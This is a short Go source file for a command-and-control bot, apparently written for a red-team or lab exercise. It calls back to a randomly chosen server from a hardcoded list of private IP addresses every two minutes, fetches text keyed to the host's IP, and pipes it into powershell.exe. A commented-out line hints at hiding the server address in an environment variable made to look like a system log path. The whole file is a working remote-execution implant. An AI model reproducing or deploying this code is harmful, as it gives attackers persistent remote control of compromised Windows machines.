// Golang bot to pull commands from webserver and execute them
// Disclaimer: This barely works
// @author: degenerat3

package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os/exec"
	"time"
)

var serv = getServer() //IP of flask serv
var src = "Snare"      // where is this calling back from
var loopTime = 120     //sleep time in secs

func getServer() string {
	//envVar := os.Getenv("SYS_OUTPUT") //fetch environment variable
	//trimmedStr := strings.Replace(envVar, "/etc/systemlogs/gaspell-", "", 1)
	//decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
	servs := make([]string, 0)
	servs = append(servs,
		"192.168.5.130",
		"192.168.5.146",
		"192.168.5.169",
		"192.168.5.171",
		"192.168.5.204",
		"192.168.5.21",
		"192.168.5.215",
		"192.168.5.218",
		"192.168.5.223",
		"192.168.5.250",
		"192.168.5.76",
		"192.168.6.137",
		"192.168.6.200",
		"192.168.6.202",
		"192.168.6.204",
		"192.168.6.44",
		"192.168.6.51",
		"192.168.6.63",
		"192.168.6.76",
		"192.168.6.95",
	)
	selection := servs[rand.Intn(len(servs))]
	return string(selection)
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/" + ip + "/" + src
	r, err := http.Get(url)
	if err != nil {
		return
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}
	fmt.Printf(string(txt))
	//exec.Command(string(txt))
	bsh := exec.Command("powershell.exe")
	stdin, _ := bsh.StdinPipe()
	go func() {
		defer stdin.Close()
		io.WriteString(stdin, string(txt))
	}()
	bsh.Run()
}

func main() {
	for {
		getCommands()
		time.Sleep(time.Duration(loopTime) * time.Second)
	}

}
